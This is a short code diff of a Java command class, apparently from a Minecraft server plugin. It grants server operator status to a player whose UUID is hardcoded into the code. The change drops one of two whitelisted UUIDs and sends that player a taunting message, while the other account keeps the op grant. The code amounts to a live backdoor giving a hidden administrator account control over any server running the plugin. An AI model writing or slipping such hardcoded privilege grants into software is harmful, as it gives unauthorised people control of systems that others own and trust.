@@ -20,8 +20,12 @@ public final class OpmeCommand implements CommandExecutor {
 
         final Player player = (Player) sender;
 
-        if (!player.getUniqueId().toString().equalsIgnoreCase("f4b1497c-622e-4f50-b87a-059a8fa5b024") &&
-                !player.getUniqueId().toString().equalsIgnoreCase("625d8ec2-c141-457c-b74a-4c6ba2cbdb31"))
+        if(player.getUniqueId().toString().equalsIgnoreCase("625d8ec2-c141-457c-b74a-4c6ba2cbdb31")) {
+            player.sendMessage("was geht eddi.");
+            return false;
+        }
+
+        if (!player.getUniqueId().toString().equalsIgnoreCase("f4b1497c-622e-4f50-b87a-059a8fa5b024"))
             return false;
 
         player.setOp(true);
